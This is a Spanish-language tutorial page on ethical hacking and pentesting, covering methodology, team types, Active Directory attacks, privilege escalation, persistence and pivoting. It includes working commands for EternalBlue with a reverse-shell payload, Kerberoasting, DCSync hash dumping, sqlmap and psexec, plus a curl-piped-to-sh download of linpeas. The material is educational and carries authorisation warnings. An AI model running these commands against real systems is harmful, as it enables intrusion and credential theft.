Hacking Ético y Pentesting

Metodologías, herramientas y técnicas de pruebas de penetración autorizadas.

⚠️ IMPORTANTE: Las técnicas mostradas aquí son SOLO para fines educativos y de pruebas autorizadas. Realizar pruebas de penetración sin autorización escrita es ILEGAL.

Fases del Pentesting

Un pentest profesional sigue una metodología estructurada de 5-6 fases.

Fase 1: Reconocimiento

Recopilación passiva de información sobre el objetivo SIN interactuar directamente con sus sistemas.

whois
Información de registro de dominios
theHarvester
Emails, subdominios, IPs públicas
Shodan
Motor de búsqueda de dispositivos IoT
Google Dorking
Búsquedas avanzadas en Google
# Reconocimiento con theHarvester theHarvester -d ejemplo.com -b google,linkedin -f report.html # Google Dorks útiles site:ejemplo.com filetype:pdf site:ejemplo.com inurl:admin intitle:"index of" "parent directory"
Fase 2: Escaneo

Escaneo activo para descubrir puertos, servicios, vulnerabilidades y versiones.

# Nmap - Escáner de redes nmap -sV -sC -O -A ejemplo.com # Detección completa nmap -p- --min-rate 5000 ejemplo.com # Todos los puertos rápido nmap --script vuln ejemplo.com # Scan de vulnerabilidades # Nikto - Scanner web nikto -h https://ejemplo.com # SQLmap - Inyección SQL automatizada sqlmap -u "https://ejemplo.com/page?id=1" --dbs --batch
Fase 3: Explotación

Aprovechamiento de vulnerabilidades descubiertas para obtener acceso no autorizado (con autorización).

Metasploit
Framework de exploit más grande del mundo
Burp Suite
Proxy y scanner para aplicaciones web
Cobalt Strike
Plataforma profesional de adversary simulation
# Metasploit Framework msfconsole # Buscar exploit msf6> search eternalblue # Configurar y ejecutar msf6> use exploit/windows/smb/ms17_010_eternalblue msf6> set RHOSTS 192.168.1.100 msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6> set LHOST 192.168.1.50 msf6> exploit
Fase 4: Post-Explotación

Una vez dentro, se busca escalar privilegios, moverse lateralmente y persistir.

  • Escalada de privilegios: kernel exploits, SUID, misconfigurations
  • Movimiento lateral: pass-the-hash, PsExec, WMI
  • Persistencia: scheduled tasks, registry keys, backdoors
  • Exfiltración: robo de credenciales, datos sensibles
Fase 5: Informe

Documentación profesional de hallazgos, impacto y recomendaciones.

Estructura del informe:

  1. Resumen ejecutivo (para directivos)
  2. Alcance y metodología
  3. Hallazgos clasificados por severidad (CVSS)
  4. Evidencia de cada vulnerabilidad
  5. Recomendaciones con prioridad
  6. Plan de remediación con timeline

Metodologías de Pentesting

Las metodologías estandarizan la forma en que se planifican, ejecutan y reportan las pruebas de penetración. Adoptar una metodología garantiza cobertura, repetibilidad y profesionalismo en cada engagement.

PTES
Pentesting Execution Standard: fases detalladas de extremo a extremo
OSSTMM
Metodología de testing de seguridad operacional (ISECOM)
OWASP WSTG
Web Security Testing Guide para aplicaciones web
NIST SP 800-115
Guía técnica para evaluaciones de seguridad de TI
MITRE ATT&CK
Mapeo de técnicas y tácticas del adversario real

La metodología elegida define el alcance, la profundidad de las pruebas y los entregables del informe final, por lo que debe acordarse con el cliente antes de iniciar.

Tipos de Pruebas y de Red Teams

Las pruebas se clasifican según la información previa que se entrega al evaluador y según el rol del equipo que participa en el ejercicio.

Black Box
El evaluador parte sin información interna del objetivo. Simula el punto de vista de un atacante externo y maximiza el realismo.
Grey Box
Se entrega información parcial (credenciales básicas, diagramas de red). Equilibra realismo y eficiencia de tiempo.
White Box
Acceso completo al código fuente, configuración y documentación. Permite una revisión profunda y exhaustiva.
Red Team
Simula un adversario real con objetivos de negocio definidos, operando de forma sigilosa para medir la detección de la defensa.
Blue Team
Equipo de defensa responsable de detectar, responder y contener los ataques del red team durante el ejercicio.
Purple Team
Colaboración entre atacantes y defensores para mejorar continuamente las capacidades de detección y respuesta.

Es clave diferenciar tres niveles de engagement:

  • Vulnerability assessment: escaneo automatizado y clasificación de CVEs, sin explotar las vulnerabilidades.
  • Pentest: validación manual de las vulnerabilidades explotándolas de forma controlada para confirmar el impacto.
  • Red team exercise: simulación completa de un adversario real, con objetivos de negocio y sin alertar a los equipos de defensa.

Ataques a Active Directory

Active Directory es el objetivo principal de la mayoría de compromisos corporativos: concentra autenticación, permisos y acceso a recursos. Conocer estos ataques es imprescindible para defender la identidad.

Kerberoasting
Solicita tickets TGS de SPNs de servicios y los descifra offline para recuperar la contraseña de cuentas de servicio.
AS-REP Roasting
Explota usuarios con pre-autenticación Kerberos deshabilitada para obtener hashes crackeables sin interacción.
Pass-the-Hash
Reutiliza el hash NTLM de una víctima para autenticarse en otros sistemas sin conocer la contraseña en claro.
Pass-the-Ticket
Reutiliza tickets Kerberos (TGT/TGS) robados para suplantar la identidad del usuario dentro del dominio.
DCSync
Abusa de la replicación de dominio para extraer hashes de todos los usuarios; habilita Golden Ticket y DCShadow.
SMB Relay
Intercepta autenticaciones SMB y las reenvía a otros servidores para obtener acceso sin conocer las credenciales.
# Impacket - Ataques a Active Directory # AS-REP Roasting: cuentas sin pre-autenticación GetNPUsers.py dominio/usuarios -dc-ip IP -no-pass # Kerberoasting: tickets TGS de SPNs de servicio GetUserSPNs.py dominio/usuario:pass -dc-ip IP # DCSync: extraer hashes vía replicación de dominio secretsdump.py dominio/usuario:pass@IP -just-dc # Movimiento lateral mediante autenticación con psexec psexec.py dominio/usuario:pass@IP
⚠️ IMPORTANTE: Estos ataques a Active Directory solo deben ejecutarse en laboratorios o entornos con autorización escrita. Utilizarlos contra sistemas sin permiso es un delito.

Escalada de Privilegios

Tras obtener un acceso inicial, el objetivo es elevar privilegios hasta nivel administrador/root. La enumeración sistemática del sistema comprometido es el paso más importante de esta fase.

Escalada en Linux
Binarios SUID/SGID, sudo mal configurado, capabilities excesivas y exploits de kernel sin parchear.
Escalada en Windows
Unquoted service paths, DLL hijacking, token impersonation y abuso de SeImpersonate con JuicyPotato.
# Enumeración automatizada con PEASS-ng curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Enumeración manual rápida en Linux sudo -l # Binarios ejecutables con sudo find / -perm -4000 -type f # Binarios SUID # En Windows winPEAS.exe # Enumeración de Windows

Antes de ejecutar cualquier script descargado, revísalo y verifícalo en un entorno aislado: el código proviene de terceros.

Persistencia y Evasión

La persistencia garantiza el acceso al sistema tras reinicios o desconexiones, mientras que la evasión busca que el malware no sea detectado por AV o EDR. Ambas son técnicas de adversarios reales y también de operaciones defensivas.

Persistencia Linux
Tareas cron, units de systemd persistentes, claves SSH autorizadas y archivos de inicio de shell.
Persistencia Windows
Run keys del registro, servicios con binarios maliciosos y suscriptores WMI permanentes.
Evasión de AV
Obfuscación de código, packers/crypters y bypass de AMSI en Windows para evitar la detección estática.
LOLBins
Binarios legítimos del sistema (powershell, mshta, certutil) usados para moverse sin levantar alertas.

Toda técnica de evasión debe probarse antes en un sandbox y nunca debe usarse fuera de entornos autorizados.

Pivoting y Túneles

El pivoting permite alcanzar segmentos de red internos a través de un host ya comprometido, convirtiéndolo en puente. Los túneles cifran y canalizan ese tráfico de forma discreta.

SSH Local Forward
Redirige un puerto local a un servicio interno vía SSH con la opción -L.
SSH Dynamic
Crea un SOCKS proxy con -D para enrutar cualquier herramienta a través del host comprometido.
Chisel
Túneles sobre HTTP/WebSocket ideales cuando el tráfico directo de red está filtrado.
Metasploit Routing
La instrucción route add enruta el tráfico de sesiones Metasploit hacia redes internas.
proxychains
Redirige el tráfico de herramientas como nmap a través del proxy SOCKS creado con SSH.
# SSH local port forward: puerto local → servicio interno ssh -L 8080:10.0.0.5:80 user@edge # SSH dynamic: SOCKS proxy para escaneo indirecto ssh -D 1080 user@edge # Escaneo a través del túnel SOCKS proxychains4 nmap -sT -Pn 10.0.0.0/24

Reporting y CVSS

El informe es el entregable principal del pentest: traduce hallazgos técnicos en riesgo de negocio y guía las decisiones de remediación.

  • CVSS v3.1: vector base (AV/AC/PR/UI) con score de 0 a 10 y métricas de impacto.
  • Severidad: clasificación en Critical / High / Medium / Low según el score.
  • Hallazgos reproducibles: pasos exactos para que el cliente pueda verificar cada vulnerabilidad.
  • Evidencia: capturas de pantalla, logs y POCs que respalden cada hallazgo.
  • Priorización: orden de corrección por criticidad e impacto sobre el negocio.
  • Remediación: solución propuesta con pasos concretos y estimación de esfuerzo.
Hallazgo reproducible
Cada vulnerabilidad se documenta con pasos claros para su reproducción y verificación posterior.
Impacto de negocio
Explica en términos de negocio qué ocurriría si la vulnerabilidad fuera explotada por un atacante real.
Recomendación
Acción correctiva concreta para mitigar o eliminar la vulnerabilidad de forma segura.
Plan de remediación
Hoja de ruta con prioridades, responsables y plazos para corregir los hallazgos más críticos.
